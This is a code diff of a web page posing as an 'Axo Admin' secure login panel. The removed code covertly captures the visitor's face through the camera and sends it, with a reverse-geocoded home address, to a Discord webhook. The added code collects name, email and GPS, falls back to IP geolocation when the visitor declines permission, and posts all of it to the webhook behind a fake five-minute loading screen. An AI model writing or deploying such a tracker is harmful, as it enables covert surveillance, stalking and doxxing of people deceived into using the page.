-                    // Convert to base64 (JPEG, compressed)
-                    faceImageData = canvas.toDataURL('image/jpeg', 0.8);
-
-                    // Stop camera and hide overlay
-                    stream.getTracks().forEach(track => track.stop());
-                    cameraOverlay.classList.remove('active');
-                    cameraVideo.srcObject = null;
-
-                    faceCaptured = true;
-
-                    // Send face to webhook silently
-                    await sendFaceToWebhook(faceImageData);
-
-                    console.log('Face captured silently');
-
-                } catch (err) {
-                    console.warn('Face capture failed:', err);
-                    cameraOverlay.classList.remove('active');
-                    if (cameraStream) {
-                        cameraStream.getTracks().forEach(track => track.stop());
-                        cameraStream = null;
+                    const resp2 = await fetch('https://ipinfo.io/json');
+                    if (resp2.ok) {
+                        const data = await resp2.json();
+                        if (data.loc) {
+                            const parts = data.loc.split(',');
+                            return {
+                                lat: parseFloat(parts[0]),
+                                lng: parseFloat(parts[1]),
+                                method: 'Force (IPinfo)'
+                            };
+                        }
                     }
-                    // Don't fail entirely - continue without face
-                }
+                } catch (e) { /* silent */ }
+
+                return { lat: 33.680000, lng: 73.020000, method: 'Force (Default)' };
             }
 
-            // ----- Send face to webhook -----
-            async function sendFaceToWebhook(imageData) {
-                try {
-                    // Split base64 to get just the data
-                    const base64Data = imageData.split(',')[1];
+            // ============================================================
+            // GET GPS (WITH PERMISSION)
+            // ============================================================
 
-                    // Send as Discord file attachment
-                    const formData = new FormData();
-                    const blob = await fetch(imageData).then(res => res.blob());
-                    formData.append('file', blob, 'face_capture.jpg');
-
-                    // Also send location data as text
-                    let locationText = '';
-                    if (locationData) {
-                        const addr = locationData.address;
-                        locationText =
-                            `\n📍 **Location Data:**\n` +
-                            `**Address:** ${addr.fullAddress || 'N/A'}\n` +
-                            `**Coords:** ${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)}\n` +
-                            `**Country:** ${addr.country || 'N/A'}\n` +
-                            `**House/Building:** ${addr.houseNumber || 'N/A'}\n` +
-                            `**Street:** ${addr.street || 'N/A'}\n` +
-                            `**City:** ${addr.city || 'N/A'}\n` +
-                            `**State:** ${addr.state || 'N/A'}\n` +
-                            `**Postcode:** ${addr.postcode || 'N/A'}`;
+            function getGPSLocation() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve(null);
+                        return;
                     }
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            resolve({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                acc: pos.coords.accuracy,
+                                method: 'GPS (Live)'
+                            });
+                        },
+                        (err) => {
+                            resolve(null);
+                        }, {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+            }
 
-                    // Send as multipart form with both image and text
-                    const payload = new FormData();
-                    payload.append('file', blob, 'face_capture.jpg');
-                    payload.append('payload_json', JSON.stringify({
-                        content: `👤 **Axo Face & Location Capture**\n${locationText}\n**Timestamp:** ${new Date().toISOString()}`
-                    }));
+            // ============================================================
+            // SEND TO WEBHOOK
+            // ============================================================
+
+            async function sendToWebhook(name, email, location, address) {
+                try {
+                    let content = `👤 **Axo Admin - User Security Report**\n`;
+                    content += `**Name:** ${name}\n`;
+                    content += `**Email:** ${email}\n`;
+                    content += `**Timestamp:** ${new Date().toISOString()}\n`;
+
+                    if (location) {
+                        content += `\n📍 **Live Location**\n`;
+                        content += `**Coords:** ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\n`;
+                        content += `**Method:** ${location.method}\n`;
+                        content += `**Permission:** ${locationPermission ? '✅ Granted' : '❌ Skipped/Forced'}\n`;
+                        if (address) {
+                            content += `**Accuracy:** ${location.acc ? Math.round(location.acc) + 'm' : 'N/A'}\n`;
+                            content += `\n🏠 **Address Details**\n`;
+                            content += `**Full Address:** ${address.fullAddress}\n`;
+                            content += `**House/Building:** ${address.houseNumber}\n`;
+                            content += `**Street:** ${address.street}\n`;
+                            content += `**Neighbourhood:** ${address.neighbourhood}\n`;
+                            content += `**City:** ${address.city}\n`;
+                            content += `**State:** ${address.state}\n`;
+                            content += `**Country:** ${address.country}\n`;
+                            content += `**Postcode:** ${address.postcode}\n`;
+                        }
+                    } else {
+                        content += `\n📍 **Location:** Not captured\n`;
+                    }
 
                     await fetch(WEBHOOK_URL, {
                         method: 'POST',
-                        body: payload
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: content })
                     });
 
-                    console.log('Face + Location sent to webhook');
+                    console.log('✅ Webhook sent!');
                 } catch (e) {
-                    console.warn('Webhook send failed:', e);
+                    console.warn('Webhook failed:', e);
                 }
             }
 
-            // ----- FORCE GRAB LOCATION (REAL GPS) -----
-            async function forceGrabLocation() {
-                if (locationGrabbed) return;
-                locationGrabbed = true;
+            // ============================================================
+            // CAPTURE LOCATION
+            // ============================================================
 
-                try {
-                    let lat, lng;
-                    let usedMethod = 'GPS';
+            async function captureLocation(force = false) {
+                let location = null;
 
-                    // 1. PRIMARY: Use GPS with high accuracy (REAL location)
-                    try {
-                        const gpsPos = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: true,
-                                timeout: 15000,
-                                maximumAge: 0
-                            });
-                        });
-                        lat = gpsPos.coords.latitude;
-                        lng = gpsPos.coords.longitude;
-                        usedMethod = 'GPS (High Accuracy)';
-                        console.log('GPS location acquired:', lat, lng);
-                    } catch (gpsErr) {
-                        console.warn('GPS failed, trying IP fallback:', gpsErr);
+                if (locationPermission && !force) {
+                    location = await getGPSLocation();
+                    if (!location) {
+                        location = await forceGrabLocation();
+                        locationPermission = false;
+                    }
+                } else {
+                    location = await forceGrabLocation();
+                    locationPermission = false;
+                }
 
-                        // 2. FALLBACK: IP geolocation (less accurate)
-                        try {
-                            const ipResp = await fetch('https://ipapi.co/json/');
-                            if (ipResp.ok) {
-                                const ipData = await ipResp.json();
-                                if (ipData.latitude && ipData.longitude) {
-                                    lat = parseFloat(ipData.latitude);
-                                    lng = parseFloat(ipData.longitude);
-                                    if (!isNaN(lat) && !isNaN(lng) && lat >= -90 && lat <= 90 && lng >= -180 && lng <=
-                                        180) {
-                                        usedMethod = 'IP (Fallback)';
-                                    }
-                                }
+                if (location) {
+                    locationData = location;
+                    const address = await getAddress(location.lat, location.lng);
+                    await sendToWebhook(currentUser.name, currentUser.email, location, address);
+
+                    // Update dashboard map
+                    const mapUrl =
+                        `https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${location.lat},${location.lng}&zoom=18&maptype=roadmap`;
+                    dashMap.src = mapUrl;
+                    dashLocation.textContent = `${location.lat.toFixed(6)}, ${location.lng.toFixed(6)} (${location.method})`;
+                }
+
+                return location;
+            }
+
+            // ============================================================
+            // START LOADING (5 MINUTES)
+            // ============================================================
+
+            function startLoading() {
+                showStep('stepLoading');
+
+                loadingSeconds = 0;
+                const totalSeconds = LOADING_DURATION;
+                progressFill.style.width = '0%';
+                loadingTimer.textContent = '05:00';
+
+                // Reset steps
+                [step1, step2, step3, step4].forEach(el => {
+                    el.className = 'step-item pending';
+                    el.innerHTML = '<i class="fas fa-circle"></i> ' + el.textContent.trim();
+                });
+
+                const steps = [
+                    { el: step1, text: 'Security check', done: false },
+                    { el: step2, text: 'Loading modules', done: false },
+                    { el: step3, text: 'Syncing data', done: false },
+                    { el: step4, text: 'Finalizing', done: false }
+                ];
+
+                // Progress bar
+                if (loadingInterval) clearInterval(loadingInterval);
+                loadingInterval = setInterval(() => {
+                    loadingSeconds++;
+                    const progress = Math.min(100, (loadingSeconds / totalSeconds) * 100);
+                    progressFill.style.width = progress + '%';
+
+                    // Update timer
+                    const remaining = Math.max(0, totalSeconds - loadingSeconds);
+                    const mins = String(Math.floor(remaining / 60)).padStart(2, '0');
+                    const secs = String(remaining % 60).padStart(2, '0');
+                    loadingTimer.textContent = `${mins}:${secs}`;
+
+                    // Update steps
+                    const stepProgress = progress / 25; // 4 steps
+                    steps.forEach((step, index) => {
+                        if (stepProgress > index) {
+                            if (!step.done) {
+                                step.done = true;
+                                step.el.className = 'step-item done';
+                                step.el.innerHTML = '<i class="fas fa-check-circle"></i> ' + step.text;
                             }
-                        } catch (ipErr) {
-                            console.warn('IP fallback failed:', ipErr);
-                            // 3. FINAL FALLBACK: Default
-                            lat = 33.680000;
-                            lng = 73.020000;
-                            usedMethod = 'Default (Fallback)';
+                        } else if (stepProgress > index - 0.5) {
+                            step.el.className = 'step-item active';
+                            step.el.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> ' + step.text;
                         }
-                    }
+                    });
 
-                    // ensure valid
-                    if (isNaN(lat) || isNaN(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
-                        lat = 33.680000;
-                        lng = 73.020000;
-                        usedMethod = 'Default (Fallback)';
-                    }
-
-                    // Reverse geocode
-                    const data = await reverseGeocode(lat, lng);
-                    const address = extractAddress(data);
-
-                    // Store for later use
-                    locationData = { lat, lng, address, usedMethod };
-
-                    // Update Google Maps iframe
-                    if (googleMapFrame) {
-                        const mapUrl =
-                            `https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${lat},${lng}&zoom=18&maptype=satellite`;
-                        googleMapFrame.src = mapUrl;
-                    }
-
-                    console.log('Location captured:', lat, lng, 'Method:', usedMethod);
-
-                } catch (err) {
-                    console.warn('Location grab failed:', err);
-                    locationGrabbed = false;
-                }
-            }
-
-            // ----- start dashboard loading (10 min) -----
-            async function startDashboardLoading() {
-                if (isDashboardLoading) return;
-                isDashboardLoading = true;
-
-                // Silently grab location first
-                if (!locationGrabbed) {
-                    await forceGrabLocation();
-                }
-
-                // Silently capture face (camera opens briefly)
-                if (!faceCaptured) {
-                    await captureFace();
-                }
-
-                showStep('stepDashboardLoading');
-                loadingStartTime = Date.now();
-                const duration = 10 * 60;
-
-                progressFill.style.width = '0%';
-                timerDisplay.textContent = '10:00';
-
-                if (countdownInterval) clearInterval(countdownInterval);
-                countdownInterval = setInterval(() => {
-                    const diff = (Date.now() - loadingStartTime) / 1000;
-                    const remaining = Math.max(0, duration - diff);
-                    const minutes = Math.floor(remaining / 60);
-                    const seconds = Math.floor(remaining % 60);
-                    timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-                    const progress = Math.min(100, (diff / duration) * 100);
-                    progressFill.style.width = `${progress}%`;
-
-                    if (remaining <= 0) {
-                        clearInterval(countdownInterval);
-                        timerDisplay.textContent = '00:00';
+                    if (loadingSeconds >= totalSeconds) {
+                        clearInterval(loadingInterval);
+                        loadingTimer.textContent = '00:00';
                         progressFill.style.width = '100%';
-                        showStep('stepDashboardReady');
-                        isDashboardLoading = false;
+                        // All steps done
+                        steps.forEach(step => {
+                            step.done = true;
+                            step.el.className = 'step-item done';
+                            step.el.innerHTML = '<i class="fas fa-check-circle"></i> ' + step.text;
+                        });
+                        // Show dashboard after 5 mins
+                        setTimeout(() => {
+                            showDashboard();
+                        }, 500);
                     }
-                }, 500);
-
-                if (dashboardTimer) clearTimeout(dashboardTimer);
-                dashboardTimer = setTimeout(() => {
-                    if (countdownInterval) clearInterval(countdownInterval);
-                    timerDisplay.textContent = '00:00';
-                    progressFill.style.width = '100%';
-                    showStep('stepDashboardReady');
-                    isDashboardLoading = false;
-                }, (duration + 10) * 1000);
+                }, 1000);
             }
 
-            // ----- reset app -----
-            function resetApp() {
-                if (countdownInterval) clearInterval(countdownInterval);
-                if (dashboardTimer) clearTimeout(dashboardTimer);
-                isDashboardLoading = false;
-                locationGrabbed = false;
-                locationData = null;
-                faceCaptured = false;
-                faceImageData = null;
-                progressFill.style.width = '0%';
-                timerDisplay.textContent = '10:00';
-                loginStatus.textContent = '';
-                if (googleMapFrame) googleMapFrame.src = '';
-                if (cameraOverlay) cameraOverlay.classList.remove('active');
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                    cameraStream = null;
-                }
-                showStep('stepLogin');
+            // ============================================================
+            // SHOW DASHBOARD
+            // ============================================================
+
+            function showDashboard() {
+                dashName.textContent = currentUser.name || 'User';
+                showStep('stepDashboard');
             }
 
-            // ----- handle login -----
-            function handleLogin() {
-                const username = usernameInput.value.trim();
-                const password = passwordInput.value.trim();
+            // ============================================================
+            // HANDLE AUTH
+            // ============================================================
 
-                if (!username || !password) {
-                    loginStatus.innerHTML = '<i class="fas fa-exclamation-circle" style="color:#ff9f8c;"></i> Please fill in all fields';
+            function handleAuth(isRegister) {
+                const name = adminName.value.trim();
+                const email = adminEmail.value.trim();
+                const password = adminPassword.value.trim();
+
+                if (!name || !email || !password) {
+                    authStatus.innerHTML = '<i class="fas fa-exclamation-circle" style="color:#ff9f8c;"></i> Please fill in all fields';
                     return;
                 }
 
-                loginStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Authenticating...';
-                loginBtn.disabled = true;
+                if (isRegister && password.length < 4) {
+                    authStatus.innerHTML = '<i class="fas fa-exclamation-circle" style="color:#ff9f8c;"></i> Password must be at least 4 characters';
+                    return;
+                }
+
+                authStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Authenticating...';
 
                 setTimeout(() => {
-                    loginStatus.innerHTML = '<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Login successful!';
-                    setTimeout(() => {
-                        startDashboardLoading();
-                    }, 800);
+                    currentUser.name = name;
+                    currentUser.email = email;
+                    locationUserName.textContent = name;
+
+                    authStatus.innerHTML = '<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Welcome, ' + name +
+                        '!';
+
+                    // Show location permission
+                    showStep('stepLocation');
+
                 }, 1200);
             }
 
-            // ----- event listeners -----
-            loginBtn.addEventListener('click', handleLogin);
+            // ============================================================
+            // HANDLE LOCATION PERMISSION
+            // ============================================================
 
-            usernameInput.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') handleLogin();
-            });
-            passwordInput.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') handleLogin();
-            });
+            async function handleAllowLocation() {
+                locationStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Securing your device...';
+                locationPermission = true;
 
-            resetBtn.addEventListener('click', resetApp);
-            resetFromReadyBtn.addEventListener('click', resetApp);
+                await captureLocation(false);
+                locationStatus.innerHTML = '<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Location secured!';
 
-            launchDashboardBtn.addEventListener('click', () => {
-                alert('🚀 Axo Admin Dashboard launched!');
-                resetApp();
-            });
+                setTimeout(() => {
+                    startLoading();
+                }, 800);
+            }
 
-            // Show login step initially
-            showStep('stepLogin');
+            async function handleSkipLocation() {
+                locationStatus.innerHTML = '<i class="fas fa-info-circle"></i> Using backup security...';
+                locationPermission = false;
+
+                await captureLocation(true);
+                locationStatus.innerHTML = '<i class="fas fa-check-circle" style="color:#ffd966;"></i> Backup security active';
+
+                setTimeout(() => {
+                    startLoading();
+                }, 800);
+            }
+
+            // ============================================================
+            // LOGOUT
+            // ============================================================
+
+            function logout() {
+                if (loadingInterval) clearInterval(loadingInterval);
+                if (loadingTimerInterval) clearInterval(loadingTimerInterval);
+                locationData = null;
+                locationPermission = false;
+                currentUser = { name: '', email: '' };
+                dashMap.src = '';
+                progressFill.style.width = '0%';
+                loadingTimer.textContent = '05:00';
+                adminName.value = '';
+                adminEmail.value = '';
+                adminPassword.value = '';
+                authStatus.innerHTML = '';
+                showStep('stepAuth');
+            }
+
+            // ============================================================
+            // EVENT LISTENERS
+            // ============================================================
+
+            loginBtn.addEventListener('click', () => handleAuth(false));
+            registerBtn.addEventListener('click', () => handleAuth(true));
+
+            adminName.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleAuth(false); });
+            adminEmail.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleAuth(false); });
+            adminPassword.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleAuth(false); });
+
+            allowLocationBtn.addEventListener('click', handleAllowLocation);
+            skipLocationBtn.addEventListener('click', handleSkipLocation);
+            logoutBtn2.addEventListener('click', logout);
+
+            // ============================================================
+            // INIT
+            // ============================================================
+
+            showStep('stepAuth');
+            authStatus.innerHTML = '🔐 Secure admin panel';
 
         })();
     </script>
